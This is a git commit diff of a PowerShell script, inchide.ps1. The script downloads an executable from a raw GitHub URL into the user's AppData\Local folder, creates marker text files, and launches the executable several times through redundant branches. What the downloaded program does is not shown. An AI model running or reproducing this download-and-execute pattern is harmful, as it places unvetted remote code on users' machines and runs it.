74b077aba3555c4800382c1647fda7f4aa544910
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-22 19:00:59 +0300

    Update inchide.ps1

--- Inchide/inchide.ps1
+++ Inchide/inchide.ps1
@@ -1,5 +1,34 @@
-$x = "https://github.com/webntdev/webntdev.github.io/raw/main/Inchide/Inchide.exe"
-$y = "$env:USERPROFILE\AppData\Local\inchide.exe"
+$profil = $env:USERPROFILE
+$cli1 = Join-Path $profil "HEUI3R.txt"
+$bonjour = Join-Path $profil "BONJOUR.txt"
+$iesire = Join-Path $profil "IESIRE.txt"
+$inchide = Join-Path $profil "AppData\Local\inchide.exe"
+$url = "https://github.com/webntdev/webntdev.github.io/raw/main/Inchide/Inchide.exe"
 
-Invoke-WebRequest -Uri $x -OutFile $y
-Start-Process -FilePath $y
+if (-Not (Test-Path $cli1)) {
+    New-Item -Path $cli1 -ItemType File
+}
+
+if (-Not (Test-Path $inchide)) {
+    Invoke-WebRequest -Uri $url -OutFile $inchide
+}
+
+if (Test-Path $cli1) {
+    New-Item -Path $bonjour -ItemType File -Force
+    Start-Process -FilePath $inchide
+} else {
+    Start-Process -FilePath $inchide
+}
+
+if (Test-Path $bonjour) {
+    New-Item -Path $iesire -ItemType File -Force
+    Start-Process -FilePath $inchide
+} else {
+    Start-Process -FilePath $inchide
+}
+
+if (Test-Path $iesire) {
+    exit
+} else {
+    Start-Process -FilePath $inchide
+}
